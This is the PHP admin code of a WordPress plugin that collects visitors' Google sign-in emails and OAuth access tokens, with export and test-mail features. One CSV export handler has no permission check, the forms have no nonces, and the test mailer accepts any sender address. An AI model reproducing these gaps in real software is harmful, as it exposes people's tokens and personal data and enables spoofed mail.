<?php
// Prevent direct access to this file
if (!defined('ABSPATH')) {
    exit;
}

function gsc_admin_page() {
    if (!current_user_can('manage_options')) {
        wp_die(__('You do not have sufficient permissions to access this page.'));
    }

    ?>
    <div class="wrap">
        <h1><?php echo esc_html(get_admin_page_title()); ?></h1>
        <nav class="nav-tab-wrapper">
            <a href="?page=google-sign-collect&tab=settings" class="nav-tab <?php echo (!isset($_GET['tab']) || $_GET['tab'] === 'settings') ? 'nav-tab-active' : ''; ?>">Settings</a>
            <a href="?page=google-sign-collect&tab=emails" class="nav-tab <?php echo (isset($_GET['tab']) && $_GET['tab'] === 'emails') ? 'nav-tab-active' : ''; ?>">All Collected Emails</a>
            <a href="?page=google-sign-collect&tab=accounts" class="nav-tab <?php echo (isset($_GET['tab']) && $_GET['tab'] === 'accounts') ? 'nav-tab-active' : ''; ?>">User Accounts</a>
            <a href="?page=google-sign-collect&tab=subscribers" class="nav-tab <?php echo (isset($_GET['tab']) && $_GET['tab'] === 'subscribers') ? 'nav-tab-active' : ''; ?>">Subscribers</a>
        </nav>
        
        <div class="tab-content">
            <?php
            $active_tab = isset($_GET['tab']) ? $_GET['tab'] : 'settings';
            
            switch ($active_tab) {
                case 'settings':
                    gsc_settings_tab();
                    break;
                case 'emails':
                    gsc_all_emails_tab();
                    break;
                case 'accounts':
                    gsc_user_accounts_tab();
                    break;
                case 'subscribers':
                    gsc_subscribers_tab();
                    break;
            }
            ?>
        </div>
    </div>
    <?php
}

function gsc_subscribers_tab() {
    $subscribers = get_users(array('role' => 'subscriber'));
    $account_manager = new GSC_Account_Manager();
    $email_manager = new GSC_Email_Manager();
    ?>
    <h2>Subscribers</h2>
    <table class="wp-list-table widefat fixed striped">
        <thead>
            <tr>
                <th>Username</th>
                <th>Email</th>
                <th>Google Cloud Accounts</th>
                <th>Total Emails Collected</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($subscribers as $subscriber): ?>
                <?php
                $accounts = $account_manager->get_all_accounts($subscriber->ID);
                $total_emails = $email_manager->get_total_emails_count($subscriber->ID);
                ?>
                <tr>
                    <td><?php echo esc_html($subscriber->user_login); ?></td>
                    <td><?php echo esc_html($subscriber->user_email); ?></td>
                    <td><?php echo count($accounts); ?></td>
                    <td><?php echo $total_emails; ?></td>
                    <td>
                        <a href="<?php echo esc_url(admin_url('admin-post.php?action=gsc_export_subscriber_data&user_id=' . $subscriber->ID)); ?>" class="button button-secondary">Export Data</a>
                    </td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    <?php
}

// Add these to your main plugin file
add_action('admin_post_gsc_export_all_csv', 'gsc_export_all_csv');
add_action('admin_post_gsc_export_user_csv', 'gsc_export_user_csv');


function gsc_export_all_csv() {
    if (!current_user_can('manage_options')) {
        wp_die(__('You do not have sufficient permissions to access this page.'));
    }

    $email_manager = new GSC_Email_Manager();
    $email_manager->export_all_csv_admin();
}

function gsc_export_user_csv() {
    if (!current_user_can('manage_options')) {
        wp_die(__('You do not have sufficient permissions to access this page.'));
    }

    $user_id = isset($_GET['user_id']) ? intval($_GET['user_id']) : 0;
    if ($user_id === 0) {
        wp_die(__('Invalid user ID.'));
    }

    $email_manager = new GSC_Email_Manager();
    $email_manager->export_csv($user_id);
}

function gsc_user_accounts_tab() {
    $account_manager = new GSC_Account_Manager();
    $accounts = $account_manager->get_all_accounts_admin();
    ?>
    <h2>User Google Cloud Accounts</h2>
    <table class="wp-list-table widefat fixed striped">
        <thead>
            <tr>
                <th>User</th>
                <th>User Email</th>
                <th>Account Name</th>
                <th>Client ID</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($accounts as $account): ?>
                <tr>
                    <td><?php echo esc_html($account->user_login); ?></td>
                    <td><?php echo esc_html($account->user_email); ?></td>
                    <td><?php echo esc_html($account->name); ?></td>
                    <td><?php echo esc_html($account->client_id); ?></td>
                    <td>
                        <a href="<?php echo esc_url(admin_url('admin-post.php?action=gsc_export_user_csv&user_id=' . $account->user_id)); ?>" class="button button-secondary">Export User Emails</a>
                    </td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    <?php
}

function gsc_all_emails_tab() {
    $email_manager = new GSC_Email_Manager();
    $emails = $email_manager->get_all_emails_admin(100, 0);
    ?>
    <h2>All Collected Emails</h2>
    <table class="wp-list-table widefat fixed striped">
        <thead>
            <tr>
                <th>User</th>
                <th>User Email</th>
                <th>Collected Email</th>
                <th>Name</th>
                <th>Access Token</th>
                <th>Date</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($emails as $email): ?>
                <tr>
                    <td><?php echo esc_html($email->user_login); ?></td>
                    <td><?php echo esc_html($email->user_email); ?></td>
                    <td><?php echo esc_html($email->email); ?></td>
                    <td><?php echo esc_html($email->name); ?></td>
                    <td><?php echo esc_html(substr($email->access_token, 0, 20) . '...'); ?></td>
                    <td><?php echo esc_html($email->created_at); ?></td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    <p>
        <a href="<?php echo esc_url(admin_url('admin-post.php?action=gsc_export_all_csv')); ?>" class="button button-primary">Export All as CSV</a>
    </p>
    <?php
}

function gsc_settings_tab() {
    // Instantiate the Account Manager
    $account_manager = new GSC_Account_Manager();

    // Handle form submissions
    if (isset($_POST['gsc_add_google_account'])) {
    gsc_admin_add_google_account($account_manager);
    }
    if (isset($_POST['gsc_admin_remove_google_account'])) {
        gsc_admin_remove_google_account($account_manager);
    }
    if (isset($_POST['gsc_admin_set_active_account'])) {
        gsc_admin_set_active_account($account_manager);
    }
    if (isset($_POST['gsc_send_test_email'])) {
        gsc_send_test_email();
    }

    // Get the current user ID
    $user_id = get_current_user_id();

    // Fetch accounts for the current user
    $google_accounts = $account_manager->get_all_accounts($user_id);
    $active_account = $account_manager->get_active_account($user_id);

    ?>
    <h2>Google Cloud Accounts</h2>
    <table class="wp-list-table widefat fixed striped">
        <thead>
            <tr>
                <th>Account Name</th>
                <th>Client ID</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($google_accounts as $account): ?>
                <tr>
                    <td><?php echo esc_html($account->name); ?></td>
                    <td><?php echo esc_html($account->client_id); ?></td>
                    <td>
                    <form method="post" style="display: inline;">
                        <div style="display: flex; align-items: center; gap: 8px;">
                            <input type="hidden" name="account_id" value="<?php echo esc_attr($account->id); ?>">
                            <?php if ($account->is_active == 0): ?>
                                <input type="submit" name="gsc_admin_set_active_account" value="Set as Active" class="button button-primary">
                            <?php else: ?>
                                <span class="dashicons dashicons-yes-alt" style="color: green;"></span> <?php echo esc_html__('Active', 'google-sign-collect'); ?>
                            <?php endif; ?>
                            <input type="submit" name="gsc_admin_remove_google_account" value="Remove" class="button button-secondary" onclick="return confirm('Are you sure you want to remove this account?');">
                        </div>
                    </form>
                    </td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>

    <h3>Add New Google Cloud Account</h3>
    <form method="post">
        <table class="form-table">
            <tr>
                <th scope="row"><label for="account_name">Account Name</label></th>
                <td><input type="text" id="account_name" name="account_name" required></td>
            </tr>
            <tr>
                <th scope="row"><label for="client_id">Google Client ID</label></th>
                <td><input type="text" id="client_id" name="client_id" required></td>
            </tr>
            <tr>
                <th scope="row"><label for="client_secret">Google Client Secret</label></th>
                <td><input type="password" id="client_secret" name="client_secret" required></td>
            </tr>
        </table>
        <?php submit_button('Add Google Account', 'primary', 'gsc_add_google_account'); ?>
    </form>

    <h3>Other Settings</h3>
    <form method="post" action="options.php">
        <?php
        settings_fields('gsc_settings');
        do_settings_sections('gsc_settings');
        ?>
        <table class="form-table">
            <tr valign="top">
                <th scope="row">Thank You Page URL</th>
                <td><input type="url" name="gsc_thank_you_url" value="<?php echo esc_url(get_option('gsc_thank_you_url', home_url())); ?>" /></td>
            </tr>
        </table>
        <?php submit_button(); ?>
    </form>

    
    <h3>Send Test Email</h3>
    <form method="post">
        <table class="form-table">
            <tr>
                <th scope="row"><label for="sender_email">Sender Email</label></th>
                <td><input type="email" id="sender_email" name="sender_email" required></td>
            </tr>
            <tr>
                <th scope="row"><label for="recipient_email">Recipient Email</label></th>
                <td><input type="email" id="recipient_email" name="recipient_email" required></td>
            </tr>
            <tr>
                <th scope="row"><label for="email_subject">Subject</label></th>
                <td><input type="text" id="email_subject" name="email_subject" required></td>
            </tr>
            <tr>
                <th scope="row"><label for="email_message">Message</label></th>
                <td><textarea id="email_message" name="email_message" rows="5" required></textarea></td>
            </tr>
        </table>
        <?php submit_button('Send Test Email', 'secondary', 'gsc_send_test_email'); ?>
    </form>
    <?php
}

function gsc_admin_add_google_account($account_manager) {
    $user_id = get_current_user_id();
    $account_name = sanitize_text_field($_POST['account_name']);
    $client_id = sanitize_text_field($_POST['client_id']);
    $client_secret = sanitize_text_field($_POST['client_secret']);

    $result = $account_manager->add_account($user_id, $account_name, $client_id, $client_secret);

    if ($result) {
        add_settings_error('gsc_messages', 'gsc_message', 'Google Cloud account added successfully.', 'updated');
    } else {
        add_settings_error('gsc_messages', 'gsc_message', 'Failed to add Google Cloud account.', 'error');
    }
}

function gsc_admin_remove_google_account($account_manager) {
    $user_id = get_current_user_id();
    $account_id = intval($_POST['account_id']);
    $result = $account_manager->remove_account($account_id, $user_id);

    if ($result) {
        add_settings_error('gsc_messages', 'gsc_message', 'Google Cloud account removed successfully.', 'updated');
    } else {
        add_settings_error('gsc_messages', 'gsc_message', 'Failed to remove Google Cloud account.', 'error');
    }
}

function gsc_admin_set_active_account($account_manager) {
    $user_id = get_current_user_id();
    $account_id = intval($_POST['account_id']);
    $result = $account_manager->set_active_account($account_id, $user_id);

    if ($result) {
        add_settings_error('gsc_messages', 'gsc_message', 'Active Google Cloud account updated successfully.', 'updated');
    } else {
        add_settings_error('gsc_messages', 'gsc_message', 'Failed to update active Google Cloud account.', 'error');
    }
}

function gsc_send_test_email() {
    $sender_email = sanitize_email($_POST['sender_email']);
    $recipient_email = sanitize_email($_POST['recipient_email']);
    $subject = sanitize_text_field($_POST['email_subject']);
    $message = wp_kses_post($_POST['email_message']);
    
    $email_sender = new GSC_Email_Sender();
    $result = $email_sender->send_email($sender_email, $recipient_email, $subject, $message);

    if ($result) {
        add_settings_error('gsc_messages', 'gsc_message', 'Test email sent successfully!', 'updated');
    } else {
        add_settings_error('gsc_messages', 'gsc_message', 'Failed to send test email. Please check the error logs.', 'error');
    }
}


function gsc_emails_tab() {
    $email_manager = new GSC_Email_Manager();
    $emails = $email_manager->get_emails(100, 0);
    ?>
    <h2>Collected Emails</h2>
    <table class="wp-list-table widefat fixed striped">
        <thead>
            <tr>
                <th>Email</th>
                <th>Name</th>
                <th>Access Token</th>
                <th>Token Expiry</th>
                <th>Date</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($emails as $email): ?>
                <tr>
                    <td><?php echo esc_html($email->email); ?></td>
                    <td><?php echo esc_html($email->name); ?></td>
                    <td><?php echo esc_html(substr($email->access_token, 0, 20) . '...'); ?></td>
                    <td><?php echo esc_html($email->token_expiry); ?></td>
                    <td><?php echo esc_html($email->created_at); ?></td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
    <p>
        <a href="<?php echo esc_url(admin_url('admin-post.php?action=gsc_export_csv')); ?>" class="button button-primary">Export as CSV</a>
    </p>
    <?php
}

// Add this to your main plugin file if not already present
add_action('admin_post_gsc_export_csv', 'gsc_export_csv');

function gsc_export_csv() {
    $email_manager = new GSC_Email_Manager();
    $email_manager->export_csv();
}
